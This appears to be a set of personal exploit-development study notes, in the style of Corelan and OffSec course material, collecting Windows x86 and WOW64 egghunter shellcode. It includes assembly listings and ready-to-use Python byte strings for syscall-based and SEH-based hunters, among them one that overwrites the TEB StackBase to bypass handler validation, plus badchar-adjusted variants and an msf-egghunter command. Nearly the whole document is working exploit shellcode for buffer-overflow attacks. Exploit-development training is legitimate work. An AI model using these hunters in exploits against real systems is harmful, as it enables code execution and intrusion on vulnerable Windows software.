#corelan

Be aware that syscall dependant egghunters will fail if the syscall index has changed on a given version. Differences between x86, x86-64 and WOW64 egghunters.
##  MSF-EggHunter
Probably broken on win10
```bash
msf-egghunter -f raw -e d3ad -v egghunter -p windows -a x86 -f python
```

https://www.corelan.be/index.php/2019/04/23/windows-10-egghunter/
# OFFSEC x86 Win10 Egghunter (Syscall)
```python
Please see the course guide
```
## EPI x86 NtAccessCheckandAuditAlarm
ASM:
```x86
    loop_inc_page:
        or dx, 0x0fff
    loop_inc_one:
        inc edx
    loop_check:
        push edx
        xor eax, eax
        add ax, 0x01c6
        int 0x2e
        cmp al, 05
        pop edx
    loop_check_valid:
        je loop_inc_page
    is_egg:
        mov eax, 0x33643063
        mov edi, edx
        scasd
        jnz loop_inc_one
    first_half_found:
        scasd
        jnz loop_inc_one
    matched_both_halves:
        jmp edi
```

Python:
```python
egghunter  = b""
egghunter += b"\x66\x81\xCA\xFF\x0F\x42"
egghunter += b"\x52\x31\xC0\x66\x05\xC6"
egghunter += b"\x01\xCD\x2E\x3C\x05\x5A"
egghunter += b"\x74\xEC\xB8"

egghunter += b"\x63\x30\x64\x33" # Egg, "c0d3"

egghunter += b"\x89\xD7\xAF\x75\xE7"
egghunter += b"\xAF\x75\xE4\xFF\xE7"
```
## EPI SEH x86
ASM:
```x86
start:
    jmp get_seh_address  # start of jmp/call/pop

build_exception_record:
    pop ecx  # address of exception_handler
    mov eax, 0x33643063  # tag into eax
    push ecx  # push Handler of the _EXCEPTION_REGISTRATION_RECORD structure
    push 0xffffffff  # push Next of the _EXCEPTION_REGISTRATION_RECORD structure
    xor ebx, ebx
    mov dword ptr fs:[ebx], esp  # overwrite ExceptionList in the TEB with a pointer to our new
                                 # _EXCEPTION_REGISTRATION_RECORD structure
                                 # bypass RtlIsValidHandler's StackBase check by placing the memory address of 
                                 # our _except_handler function at a higher address than the StackBase.

    sub ecx, 0x04  # substract 0x04 from the pointer to exception_handler
    add ebx, 0x04  # add 0x04 to ebx
    mov dword ptr fs:[ebx], ecx  # overwrite the StackBase in the TEB
    
is_egg:
    push 0x02
    pop ecx  # load 2 into counter
    mov edi, edx  # move memory page address into edi
    repe scasd  # check for tag, if the page is invalid we trigger an exception and jump to our exception_handler function
    jnz loop_inc_one  # didn't find signature, increase ebx and repeat
    jmp edi  # found the tag

loop_inc_page:
    or dx, 0xfff  # if page is invalid the exception_handler will update eip to point here and we move to next page

loop_inc_one:
    inc edx  # increase memory page address by a byte
    jmp is_egg  # check for the tag again

get_seh_address:
    call build_exception_record  # call portion of jmp/call/pop

seh_handler:
    push 0x0c
    pop ecx  # store 0x0c in ecx to use as an offset
    mov eax, [esp+ecx]  # mov into eax the pointer to the CONTEXT structure for our exception
    mov cl, 0xb8  # mov 0xb8 into ecx which will act as an offset to the eip
                  # increase the value of eip by 0x06 in our CONTEXT so it points to the or bx,
                  # 0xfff instruction to increase the memory page

    add dword ptr ds:[eax+ecx], 0x06
    pop eax  # save return address in eax
    add esp, 0x10  # increase esp to clean the stack for our call
    push eax  # push return value back into the stack
    xor eax, eax  # null out eax to simulate ExceptionContinueExecution return
    ret
```

Python:
```python
egghunter  = b""
egghunter += b"\xEB\x2A\x59\xB8"
egghunter += b"\x63\x30\x64\x33" # Egg, "c0d3"
egghunter += b"\x51\x6A\xFF\x31\xDB\x64\x89\x23\x83\xE9\x04\x83\xC3\x04\x64\x89\x0B\x6A\x02\x59\x89\xDF\xF3\xAF\x75\x07\xFF\xE7\x66\x81\xCB\xFF\x0F\x43\xEB\xED\xE8\xD1\xFF\xFF\xFF\x6A\x0C\x59\x8B\x04\x0C\xB1\xB8\x83\x04\x08\x06\x58\x83\xC4\x10\x50\x31\xC0\xC3"
```

Modified for start address control in edx:
```python
egghunter  = b""
egghunter += b"\xEB\x2A\x59\xB8"
egghunter += EGG
egghunter += b"\x51\x6A\xFF\x31\xDB\x64\x89\x23\x83\xE9\x04\x83\xC3\x04\x64\x89\x0B\x6A\x02\x59\x89\xD7\xF3\xAF\x75\x07\xFF\xE7\x66\x81\xCA\xFF\x0F\x42\xEB\xED\xE8\xD1\xFF\xFF\xFF\x6A\x0C\x59\x8B\x04\x0C\xB1\xB8\x83\x04\x08\x06\x58\x83\xC4\x10\x50\x31\xC0\xC3"
```
# Corelan WOW64 Win10 Egghunter (Syscall)
Mona can generate version specific egghunters, maybe worth a try
```python
# Length: 46 bytes
egghunter = b""
egghunter += b"\x33\xD2"              #XOR EDX,EDX
egghunter += b"\x66\x81\xCA\xFF\x0F"  #OR DX,0FFF
egghunter += b"\x33\xDB"              #XOR EBX,EBX
egghunter += b"\x42"                  #INC EDX
egghunter += b"\x52"                  #PUSH EDX
egghunter += b"\x53"                  #PUSH EBX
egghunter += b"\x53"                  #PUSH EBX
egghunter += b"\x53"                  #PUSH EBX
egghunter += b"\x53"                  #PUSH EBX
egghunter += b"\x6A\x29"              #PUSH 29  (system call 0x29)
egghunter += b"\x58"                  #POP EAX
egghunter += b"\xB3\xC0"              #MOV BL,0C0
egghunter += b"\x64\xFF\x13"          #CALL DWORD PTR FS:[EBX] (perform the system call)
egghunter += b"\x83\xC4\x10"          #ADD ESP,0x10
egghunter += b"\x5A"                  #POP EDX
egghunter += b"\x3C\x05"              #CMP AL,5
egghunter += b"\x74\xE3"              #JE SHORT
egghunter += b"\xB8\x77\x30\x30\x74"  #MOV EAX,74303077
egghunter += b"\x8B\xFA"              #MOV EDI,EDX
egghunter += b"\xAF"                  #SCAS DWORD PTR ES:[EDI]
egghunter += b"\x75\xDE"              #JNZ SHORT
egghunter += b"\xAF"                  #SCAS DWORD PTR ES:[EDI]
egghunter += b"\x75\xDB"              #JNZ SHORT
egghunter += b"\xFF\xE7"              #JMP EDI
```
# Corelan SEH based Egghunter
### ASM
```asm
; Universal SEH based egg hunter (x86 and wow64)
; tested on Windows 7 & Windows 10
; written by Peter Van Eeckhoutte (corelanc0d3r)
; www.corelan.be - www.corelan-training.com - www.corelan-consulting.com
;
; warning: will damage stack around ESP
;
; usage: find a non-safeseh protected pointer to pop/pop/ret and put it in the placeholder below
;


[BITS 32]
CALL $+4			; getPC routine
RET
POP ECX
ADD ECX,0x1d			; offset to "handle" routine

;set up SEH record
XOR EBX,EBX
PUSH ECX			; remember where our 'custom' SE Handler routine will be
PUSH ECX			; p/p/r will fly over this one
PUSH 0x90c3585c			; trigger p/p/r again :) ; nop, ret, pop eax, pop esp ;
PUSH 0x44444444			; Replace with P/P/R address  ** PLACEHOLDER **
PUSH 0x04EB5858			; SHORT JUMP
MOV DWORD [FS:EBX],ESP		; put our SEH record to top of chain

JMP nextpage

handle:				; our custom handle
	SUB ESP,0x14		; undo changes to ESP
	XOR EBX,EBX
	MOV DWORD [FS:EBX],ESP	; make our SEH record topmost again
	MOV EDX, [ESP+24]	; pick up saved EDX
	INC EDX

nextpage:
	OR DX, 0x0FFF
	INC EDX
	MOV [ESP+24], EDX	; remember where we are searching
	MOV EAX, 0x74303077	; w00t
	MOV EDI, EDX
	SCASD
	JNZ nextpage+5
	SCASD
	JNZ nextpage+5
	JMP EDI
	
```
### Python
```python
# Length: 72 bytes
egghunter = b"\xe8\xff\xff\xff\xff\xc3\x59\x83"
egghunter += b"\xc1\x1d\x31\xdb\x51\x51\x68\x5c"
egghunter += b"\x58\xc3\x90\x68"

egghunter += b"\xaa\xaa\xaa\xaa" # replace with pointer to pop/pop/ret.  Use !mona seh
								 # must be non SafeSEH

egghunter += b"\x68\x58\x58\xeb\x04\x64\x89\x23"
egghunter += b"\xeb\x0d\x83\xec\x14\x31\xdb\x64"
egghunter += b"\x89\x23\x8b\x54\x24\x24\x42\x66"
egghunter += b"\x81\xca\xff\x0f\x42\x89\x54\x24"
egghunter += b"\x24\xb8"

egghunter += b"\x77\x30\x30\x74" # egg, w00t

egghunter += b"\x89\xd7\xaf\x75\xf1\xaf\x75\xee\xff\xe7"
```

If there are other bad chars that you can't work around then don't bother with this, just hardcode in the original and try a msfvenom encoder.
#### Modified ASM to deal with badchars in ppr
```
0:  e8 ff ff ff ff          call   4 <_main+0x4>
5:  c3                      ret
6:  59                      pop    ecx
7:  83 c1 1d                add    ecx,0x1d
a:  31 db                   xor    ebx,ebx
c:  51                      push   ecx
d:  68 44 44 44 44          push   0x44444444
12: 68 5c 58 c3 90          push   0x90c3585c
17: 68 44 44 44 44          push   0x44444444
1c: 58                      pop    eax
1d: 35 44 44 44 44          xor    eax,0x44444444
22: 50                      push   eax
23: 68 58 58 eb 04          push   0x4eb5858
28: 64 89 23                mov    DWORD PTR fs:[ebx],esp
2b: eb 0d                   jmp    3a <nextpage>
0000002d <handle>:
2d: 83 ec 14                sub    esp,0x14
30: 31 db                   xor    ebx,ebx
32: 64 89 23                mov    DWORD PTR fs:[ebx],esp
35: 8b 54 24 18             mov    edx,DWORD PTR [esp+0x18]
39: 42                      inc    edx
0000003a <nextpage>:
3a: 66 81 ca ff 0f          or     dx,0xfff
3f: 42                      inc    edx
40: 89 54 24 18             mov    DWORD PTR [esp+0x18],edx
44: b8 77 30 30 74          mov    eax,0x74303077
49: 89 d7                   mov    edi,edx
4b: af                      scas   eax,DWORD PTR es:[edi]
4c: 75 f1                   jne    3f <nextpage+0x5>
4e: af                      scas   eax,DWORD PTR es:[edi]
4f: 75 ee                   jne    3f <nextpage+0x5>
51: ff e7                   jmp    edi 
```
#### Modified Python
```python
egghunter =  b""
egghunter += b"\xE8\xFF\xFF\xFF\xFF\xC3\x59\x83\xC1\x1D\x31\xDB\x51\x68"

egghunter += b"\x44\x44\x44\x44" # Value to xor for PPR 1

egghunter += b"\x68\x5C\x58\xC3\x90\x68"

egghunter += b"\x44\x44\x44\x44" # Value to xor for PPR 2

egghunter += b"\x58\x35\x44\x44\x44\x44\x50\x68\x58\x58\xEB"
egghunter += b"\x04\x64\x89\x23\xEB\x0D\x83\xEC\x14\x31\xDB"
egghunter += b"\x64\x89\x23\x8B\x54\x24\x18\x42\x66\x81\xCA"
egghunter += b"\xFF\x0F\x42\x89\x54\x24\x18\xB8\x77\x30\x30"
egghunter += b"\x74\x89\xD7\xAF\x75\xF1\xAF\x75\xEE\xFF\xE7"
```